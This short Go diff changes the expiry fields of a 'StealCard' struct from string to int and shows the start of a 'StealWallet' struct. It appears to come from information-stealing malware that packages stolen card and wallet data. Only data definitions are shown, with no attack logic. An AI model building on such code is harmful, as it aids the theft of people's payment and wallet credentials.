@@ -312,8 +312,8 @@ type StealCard struct {
 	Profile     string `msgpack:"profile"`
 	Name        string `msgpack:"name"`
 	Number      string `msgpack:"number"`
-	ExpiryMonth string `msgpack:"expiryMonth"`
-	ExpiryYear  string `msgpack:"expiryYear"`
+	ExpiryMonth int    `msgpack:"expiryMonth"`
+	ExpiryYear  int    `msgpack:"expiryYear"`
 }
 
 type StealWallet struct {
